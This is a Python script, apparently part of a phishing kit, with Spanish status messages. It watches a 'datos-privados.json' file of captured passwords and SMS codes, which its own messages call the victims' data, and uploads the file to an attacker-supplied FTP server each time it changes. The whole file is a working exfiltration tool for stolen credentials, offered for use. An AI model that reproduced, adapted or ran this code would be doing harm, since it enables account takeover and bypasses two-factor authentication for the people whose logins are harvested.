import time
import sys
import json
import os
import time
import hashlib
import ftplib

def find(name, path):
    for root, dirs, files in os.walk(path):
        if name in files:
            return os.path.join(root, name)
    return False
    
def md5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def upload_file(path_file, file_name, server, user, passwd):
	print("uploading file " + file_name +'.json')
	session = ftplib.FTP(server, user, passwd)
	file = open(path_file,'rb')                  # file to send
	session.storbinary('STOR '+file_name+'.json', file)     # send the file
	file.close()                                    # close file and FTP
	session.quit()

def check_ftp_connection(server, user, passwd):
	try:
		session = ftplib.FTP(server, user, passwd)
		session.quit()

		return True
	except:
		return False

server_ftp = input('FTP SERVER:')
user_ftp = input('FTP USER:')
pass_ftp = input('FTP PASSWORD:')
ftp_file_name = input("Name of the file to Upload ('victims' by default PRESSING ENTER) : ") or "victims"

if check_ftp_connection(server_ftp, user_ftp, pass_ftp):
	print("FTP Login Successful, wait")
	time.sleep(2)
else:
	print("FTP Login Error, check credentials and rerun script")
	sys.exit()

print("""                                                                                                                                                                                       

Esperando contraseñas de las victimas, no cierres el script ...

  - By BorjaGalisteo
                                                                                            """)

first_time = True
victims_count = 0


while True:
	while True:
		time.sleep(2)
		file = find('datos-privados.json','../')
		if file != False:
			if first_time:
				first_time = False
				hash_file = md5(file)
				break
			else:
				if hash_file != md5(file):
					hash_file = md5(file)
					break


	with open(file) as f:
		victims = json.load(f)

	
	if len(victims) == victims_count:
		print("La victima puso el SMS code")
		upload_file(file,ftp_file_name, server_ftp, user_ftp, pass_ftp)
		continue
	else:
		print("Nueva Victima encontrada... Abriendo navegador")
		upload_file(file,ftp_file_name, server_ftp, user_ftp, pass_ftp)
		victims_count = len(victims)

